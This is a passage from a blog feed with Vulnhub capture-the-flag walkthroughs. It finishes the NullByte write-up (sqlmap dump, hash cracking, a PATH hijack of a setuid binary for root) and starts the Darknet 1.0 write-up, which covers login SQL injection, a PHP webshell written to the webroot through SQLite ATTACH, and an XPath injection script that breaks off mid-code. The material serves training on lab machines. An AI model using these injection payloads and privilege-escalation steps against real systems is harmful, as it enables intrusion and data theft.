&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --current-db
back-end DBMS: MySQL 5.0.12
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:44&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching current database
current database:    &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;

root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --tables -D seth
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:55&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching tables &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; database: &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;
Database: seth
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; table&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+-------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; users &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+-------+


root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --dump -D seth -T users
Database: seth
Table: users
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt; entries&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; id &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; pass                                        &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; user   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; position   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ramses &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;    &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; --not allowed--                             &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; isis   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; employee   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;An MD5 hashed password? I best put that through &lt;a href=&#34;http://md5decoder.org/&#34;&gt;md5decoder&lt;/a&gt; to
be rewarded with the password &lt;code&gt;omega&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-4:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;stage 4&lt;/h1&gt;

&lt;p&gt;Turns out that this is ramses&amp;rsquo;s password on the ssh service that&amp;rsquo;s running on
port 777 on the VM. So I&amp;rsquo;ll connect to that and have a look at what&amp;rsquo;s going on there.&lt;/p&gt;

&lt;p&gt;Not much in his home directory, so I&amp;rsquo;ll checkout what he&amp;rsquo;s been up to&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:~&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;cat .bash_history 
sudo -s
su eric
&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
ls
clear
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /var/www
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;backup/
ls
./procwatch 
clear
sudo -s
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /
ls
&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Interesting, ramses has something in &lt;code&gt;/var/www&lt;/code&gt;. Seems like a setuid root
binary called &lt;code&gt;procwatch&lt;/code&gt;. After running it I would assume that it&amp;rsquo;s just running &lt;code&gt;ps&lt;/code&gt;
to return a list of processes. If I run &lt;code&gt;ps&lt;/code&gt; on its own, I get the same output (minus
procwatch of course)&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s see if it calls &lt;code&gt;ps&lt;/code&gt; with an absolute path, or not. As a quick test I&amp;rsquo;ll create
a symlink to &lt;code&gt;ls&lt;/code&gt; in the current directory and name it &lt;code&gt;ps&lt;/code&gt;. Then I set the &lt;code&gt;PATH&lt;/code&gt; environment variable
with the current dir at the front.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -s /bin/ls ps
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ export PATH&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;pwd&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;:&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
ls  procwatch  ps  readme.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Excellent, it just calls &lt;code&gt;ps&lt;/code&gt; without a path. A classic issue you can often
find in programs that call other programs.&lt;/p&gt;

&lt;p&gt;So let me leverage this to get myself a root shell and ultimately the flag&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
&lt;span style=&#34;color: #75715e&#34;&gt;# whoami &lt;/span&gt;
root
&lt;span style=&#34;color: #75715e&#34;&gt;# cat /root/proof.txt&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;OUTPUT CUT&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Vulnhub Darknet1.0 write up</title>
      <link>https://svenito.github.io/nowhere/2015/06/08/vulnhub-darknet1-dot-0-write-up/</link>
      <pubDate>Mon, 08 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/06/08/vulnhub-darknet1-dot-0-write-up/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/darknet-10,120/&#34;&gt;Darknet 1.0&lt;/a&gt; by &lt;a href=&#34;https://www.vulnhub.com/author/q3rv0,111/&#34;&gt;q3rv0&lt;/a&gt;
isn&amp;rsquo;t easy&amp;hellip; for me anyway.&lt;/p&gt;

&lt;p&gt;With some help and lots of reading I did however get to the bottom of it.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s my journey&lt;/p&gt;

&lt;h1 id=&#34;stage-1:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 1&lt;/h1&gt;

&lt;p&gt;First things first: scan the target&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sV -p- 192.168.56.106

Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-03 12:57 BST
Nmap scan report for darknet.com (192.168.56.106)
Host is up (0.00017s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
57664/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:E5:9F:EC (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 second
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Not much to be had here other than a web server. Poking at the RPC ports
didn&amp;rsquo;t give any results. Browsing to the IP shows me:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/b513tfj.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;There&amp;rsquo;s no &lt;code&gt;robots.txt&lt;/code&gt; so nothing left to do but run &lt;code&gt;dirbuster&lt;/code&gt; on it. Using the
&lt;code&gt;directory-list-2.3-medium.txt&lt;/code&gt; I&amp;rsquo;m rewarded with some directories and files that
might be of interest&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/dNQnSQy.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I downloaded the &lt;code&gt;888.darknet.com.backup&lt;/code&gt; file and took a look at it.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&amp;lt;VirtualHost *:80&amp;gt;
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&amp;lt;/VirtualHost&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrmm.. a virtual host configuration. I added &lt;code&gt;192.168.56.106 888.darknet.com&lt;/code&gt; to my local &lt;code&gt;/etc/hosts&lt;/code&gt;
and then pointed my browser to &lt;code&gt;888.darknet.com&lt;/code&gt; to be presented with this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/PcMHBLd.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Initial thoughts are SQLi, so  I started with some simple SQL injections to see
if my hunch is correct. Entering a username like &lt;code&gt;&#39; or &#39;1&#39;=&#39;1&lt;/code&gt;
yields an &lt;em&gt;Ilegal&lt;/em&gt;[sic] message. So this means two things: 1) SQLi is very
probably here becasue 2) our input is filtered. I didn&amp;rsquo;t fancy working out
what chars I can and can&amp;rsquo;t use so I made a script to do that for me&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;testit&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(c):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;http://888.darknet.com/index.php&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;username=%s&amp;amp;password=%s&amp;amp;Action=Login&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(c,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c)&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;post(url,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;m&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;search(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;.*Ilegal.*&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;text)&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;m:&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;Illegal&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt; OK&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;punctuation:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;testit(c)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;which yielded the following as illegal characters.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;,	Illegal
-	Illegal
;	Illegal
&amp;lt;	Illegal
=	Illegal
&amp;gt;	Illegal
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;everything else was fair game. Well almost everything, some SQL commands aren&amp;rsquo;t
allowed either. But I&amp;rsquo;ve got enough to work with.
I have a good idea that &lt;code&gt;devnull&lt;/code&gt; is a valid user, so I&amp;rsquo;ll try to use that
info. I enter &lt;code&gt;devnull&#39;/*&lt;/code&gt; as a username hoping I am creating a query like
&lt;code&gt;SELECT * FROM users WHERE username=&#39;devnull&#39;/* AND password=&#39;xxxx&#39;;&lt;/code&gt;. Hitting
the login button confirms my input is correct.&lt;/p&gt;

&lt;p&gt;I should mention here that the VM has a bug in it so that even if you get the sqli
right, it will redirect you back to &lt;code&gt;index.php&lt;/code&gt;.  Noticed this in Burp as it
was redirection to &lt;code&gt;main.php&lt;/code&gt; after the correct SQLi, but then
going back to &lt;code&gt;index.php&lt;/code&gt;. A full reinstall of the VM will fix this, or reverting to
an earlier snapshot will also work.&lt;/p&gt;

&lt;p&gt;Ok, so now I get&lt;/p&gt;

&lt;h1 id=&#34;stage-2:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 2&lt;/h1&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/joaBvqT.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Whatever I enter here just goes somewhere without any feedback. This is completely blind
and will be a bit of a challenge.&lt;/p&gt;

&lt;p&gt;While I was unaware of the bug I mentioned earier, I ended up entering a lot of different characters into the
login form. An interesting response comes when you enter &lt;code&gt;&#39;&lt;/code&gt; for the username with any pass:
&lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;. This is the md5 of the password.
Using a number like &lt;code&gt;1&lt;/code&gt; for the password with &lt;code&gt;&#39;&lt;/code&gt; as the username gives
this error &lt;code&gt;near &amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot;: syntax error&lt;/code&gt;
These errors indicate that this is in fact a SQLite DB. This information will help me with the admin console
as I now know what I am working with. This also confirms my earlier suspicion about what the query looks
like.&lt;/p&gt;

&lt;p&gt;One useful feature of SQLite that I can exploit in this case, is its ability to create files on disk.
To leverage this, I need to find is a folder where I have permission to write files to.
I ran &lt;code&gt;dirbuster&lt;/code&gt; again and now have a few directories to try&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/zlFz06Y.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;In order to create a file with SQLite I need to attach the file in question as a database.
So I set about running commands like this&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;attach database &amp;#39;/home/devnull/public_html/test.php&amp;#39; as db;                
drop table if exists db.test;                                                    
create table db.test(payload text);                                              
insert into db.test(payload) values(&amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;From the Apache config I downloaded at the start, I know that the webroot is &lt;code&gt;/home/devnull/public_html&lt;/code&gt;,
so any directories I got back from dirbuster will be a subdirectory of that.
I try all the folders until I got a hit with the &lt;code&gt;img&lt;/code&gt; directory. So I&amp;rsquo;ve got a place to
create files, but the bad news is that &lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;eval&lt;/code&gt;, and its ilk are disabled.
This means no simple php shell. Boooo.&lt;/p&gt;

&lt;p&gt;Not to worry, I got this. I knocked up a quick PHP script to do some work for me&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;db&amp;quot;) {                                                     
    $dbhandler=new SQLite3(&amp;quot;/home/devnull/database/888-darknet.db&amp;quot;);            
                                                                                
    $query = $dbhandler-&amp;gt;query(&amp;quot;SELECT * FROM login&amp;quot;);                          
                                                                                
    while($result=$query-&amp;gt;fetchArray()){                                        
        print_r($result);                                                       
        print &amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;                                                          
    }                                                                           
}                                                                               
                                                                                
if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;ls&amp;quot;) {                                                     
    $path = $_GET[&amp;quot;arg&amp;quot;];                                                       
    @chdir($path);                                                              
    $dir = @dir($path);                                                         
    while($d = $dir-&amp;gt;read()) {                                                  
        print $d.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;                                                       
    }                                                                           
}                                                                               
if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;cat&amp;quot;) {                                                    
    $file = $_GET[&amp;quot;arg&amp;quot;];                                                       
    $fh = fopen($file, &amp;quot;r&amp;quot;);                                                    
    if ($fh) {                                                                  
        while ($l = fgets($fh)) {                                               
            print htmlspecialchars($l).&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;                                 
        }                                                                       
        fclose($fh);                                                            
    } else { print &amp;quot;Cannot open &amp;quot;.$file.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;; }                              
} 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I use this as the payload in the &lt;code&gt;INSERT&lt;/code&gt; statement.&lt;/p&gt;

&lt;p&gt;With the &lt;code&gt;cmd&lt;/code&gt; parameter I can now list directories and cat files. The database
details were added once I had got the details from the db file in the &lt;code&gt;includes&lt;/code&gt; folder.&lt;/p&gt;

&lt;p&gt;I scoped around the server a bit, looking in the usual interesting folders, seeing if there&amp;rsquo;s
anything useful. Eventually I found something interesting in the Apache
config folder. There&amp;rsquo;s another virtual host on this machine at &lt;code&gt;signal8.darknet.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Before I go on, I best mention &lt;a href=&#34;https://github.com/dotcppfile/DAws&#34;&gt;DAws&lt;/a&gt; which
will make your life super easy. I crafted a file uploader in PHP which I put on the
server with the SQL admin trick above, and then uploaded the &lt;code&gt;DAws.php&lt;/code&gt; file. This
will drop a &lt;code&gt;php.ini&lt;/code&gt; on the server that allows you to run commands, and also create
a reverse shell to your host. &lt;strong&gt;Much&lt;/strong&gt; easier than what I did, but you learn new things
all the time. This will be the PHP script I&amp;rsquo;ll be using going forward.&lt;/p&gt;

&lt;h1 id=&#34;stage-3:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 3&lt;/h1&gt;

&lt;p&gt;Ok, so now I&amp;rsquo;m looking at the list of Darknet staff. Clicking on the usernames will take
me to a php page showing me that user&amp;rsquo;s email. While I ponder the significance of this
I check for a robots.txt file and this time there is one. It lists a directory
called &lt;code&gt;xpanel&lt;/code&gt; which prompts me for another username and password combo.
No SQLi here though I&amp;rsquo;m afraid. I cannot bruteforce this either. Well I &lt;em&gt;could&lt;/em&gt;
but I don&amp;rsquo;t think I&amp;rsquo;ll get a hit any time soon.&lt;/p&gt;

&lt;p&gt;Fastforward and I&amp;rsquo;m stuck. After chatting to &lt;em&gt;g0blin&lt;/em&gt; I get a hint that the &lt;code&gt;contact.php&lt;/code&gt; is
a key. I start attempting to inject stuff into the &lt;code&gt;id&lt;/code&gt; field. Eventually I notice that I am
not looking at the same DB. The ids don&amp;rsquo;t match with what I saw before when I dumped the DB.
This is a new data store. But what is it?
SQL wasn&amp;rsquo;t getting me anywhere so I leafed through books and notes and figured it could be
XML. If it is, it will most likely be something like &lt;code&gt;...user/id=1]&lt;/code&gt; Adding &lt;code&gt;][1&lt;/code&gt; at the end will
return the first and only result, and we should get the email as per normal.
Adding &lt;code&gt;[2&lt;/code&gt; will error and return nothing as there should only be one result. If this works
I can be fairly certain that this is an XPath query.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/7jRrIo0.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Excellent, it worked. Now I need to figure out how to make use of this. XPath isn&amp;rsquo;t
something I&amp;rsquo;ve come across very often.&lt;/p&gt;

&lt;p&gt;So I begin to experiment. First off I figured out if it&amp;rsquo;s XPath V2 or XPath V1.
If entering &lt;code&gt;id=1 or count(//*)][1&lt;/code&gt; doesn&amp;rsquo;t work, but &lt;code&gt;id=1 lower-case(&#39;A&#39;)][1&lt;/code&gt; does,
then it&amp;rsquo;s XPath V2, otherwise it&amp;rsquo;s XPath V1.&lt;/p&gt;

&lt;p&gt;While I played around with this something clicked in my head and I groked enough of XPi
(XPath injection) to get to the bottom of this. Using the truth from above we can
determine the xpath names using the &lt;code&gt;substring&lt;/code&gt; function. I wrote another python
script to do the heavy lifting&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;


&lt;span style=&#34;color: #f8f8f2&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;len(sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;URL&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;http://signal8.darknet.com/contact.php&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload_tpl&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;1 and substring(name(%s),%d,1)=&amp;#39;%s&amp;#39;][1&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cmp_pos&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;carry_on&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;True&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;carry_on:&lt;/span&gt;

